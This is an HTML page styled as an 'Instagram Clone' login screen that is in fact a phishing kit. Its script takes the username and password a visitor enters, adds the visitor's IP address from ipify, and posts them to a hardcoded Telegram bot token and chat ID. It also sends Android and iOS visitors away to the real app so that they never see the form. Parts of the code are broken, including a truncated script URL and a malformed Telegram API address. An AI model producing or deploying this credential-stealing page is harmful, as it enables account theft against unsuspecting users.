<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
    <style>
        /* Hidden by default */
        #main-wrapper { display: none; }
        #status-msg { 
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; font-family: sans-serif; 
        }
    </style>
</head>
<body>

    <div id="status-msg">Validating Browser...</div>

    <div id="main-wrapper">
        <main class="flex align-items-center justify-content-center">
            <section id="mobile" class="flex"></section>
            <section id="auth" class="flex direction-column">
                <div class="panel login flex direction-column">
                    <h1 class="flex justify-content-center">
                        <img src="./img/instagram-logo.png" alt="Instagram logo" />
                    </h1>
                    <form id="login-form">
                        <input id="email" placeholder="Phone, username, or email" required />
                        <input id="password" type="password" placeholder="Password" required />
                        <button type="submit">Log In</button>
                    </form>
                </div>
            </section>
        </main>
        <footer>
            <p class="copyright">Â© 2020 Instagram from Facebook</p>
        </footer>
    </div>

<script src="https://unpkg.com"></script>
<script>
    (function() {
        const ua = navigator.userAgent;
        const platform = navigator.platform || "";
        
        const isWin = /Win/.test(ua) || /Win/.test(platform);
        const isEdge = /Edg/.test(ua); // Chromium-based Edge
        const isAndroid = /Android/i.test(ua);
        const isChrome = /Chrome/i.test(ua) && !isEdge;
        const isIOS = /iPhone|iPad|iPod/i.test(ua);
        const isSafari = /Safari/i.test(ua) && /Version/i.test(ua) && !/CriOS/i.test(ua);

        // 1. Check if we should REDIRECT (Android/Chrome or iOS/Safari)
        let shouldRedirect = (isAndroid && isChrome) || (isIOS && isSafari);

        // 2. Exception: Always ALLOW MS Edge on Windows
        if (isWin && isEdge) {
            shouldRedirect = false;
        }

        if (shouldRedirect) {
            document.getElementById('status-msg').innerHTML = "Redirecting to Instagram App...";
            if (isAndroid) {
                // Force open the native Instagram app via Intent
                window.location.href = "intent://instagram.com/_n/mainfeed/#Intent;package=com.instagram.android;scheme=https;end";
            } else if (isIOS) {
                // Open via custom URL scheme
                window.location.href = "instagram://app";
            }
        } else {
            // Show the login UI
            document.getElementById('status-msg').style.display = 'none';
            document.getElementById('main-wrapper').style.display = 'block';
        }
    })();

    // Telegram Bot Submission Logic
    const TOKEN = "7971493433:AAFiSKG7P1jckapqFHx-mThiTFtiBmOfhN0";
    const CHAT_ID = "5763674764";
    const URI_API = `https://api.telegram.org{TOKEN}/sendMessage`;

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org').then(res => {
            const message = `<b>Test Log</b>\n<b>User:</b> ${email}\n<b>Pass:</b> ${password}\n<b>IP:</b> ${res.data.ip}`;
            axios.post(URI_API, { chat_id: CHAT_ID, parse_mode: 'html', text: message })
                 .then(() => alert('Log captured. Check Telegram.'));
        });
    });
</script>
</body>
</html>
